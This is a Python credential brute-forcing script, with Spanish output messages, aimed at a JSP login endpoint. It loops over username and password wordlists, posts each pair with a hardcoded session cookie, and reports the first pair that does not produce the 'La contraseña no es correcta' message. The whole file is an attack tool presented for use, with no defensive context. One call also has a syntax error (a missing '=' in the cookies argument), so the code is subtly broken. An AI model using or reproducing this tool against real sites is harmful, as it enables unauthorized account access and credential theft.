#!/usr/bin/python3
import sys, requests, signal
from termcolor import colored, cprint

def handlerExit(sig, frame):
  cprint(f"\n\nAborting...\n", "red")
  sys.exit(0)

signal.signal(signal.SIGINT, handlerExit)

cookie = {"JSESSIONID": "99CE514232883YGCGRRR3535552F"}

def file_read(file):
  with open(file,mode='r', encoding='utf-8') as file_text:
    return file_text.read()

user = file_read("user.txt").split("\n")
password = file_read("prueba.txt").split("\n")

for i in user:
  for j in password:
    payload={
      'xAccion': 'verificarAcceso',
      'xUsuario': i, 
      'xContrasenia': j
    }

    url = f"https://web.com/jsp/acceso/things.jsp"
    response = requests.request("POST", url, data=payload, cookies cookie)

    if not "La contraseña no es correcta." in response.text:
      cprint(f" [+] {i}:{j} es valido", "green", attrs=["bold"], file=sys.stderr)
      sys.exit(0)
    cprint(f" [-] {i}:{j} no es valido", "red", attrs=["bold"], file=sys.stderr)
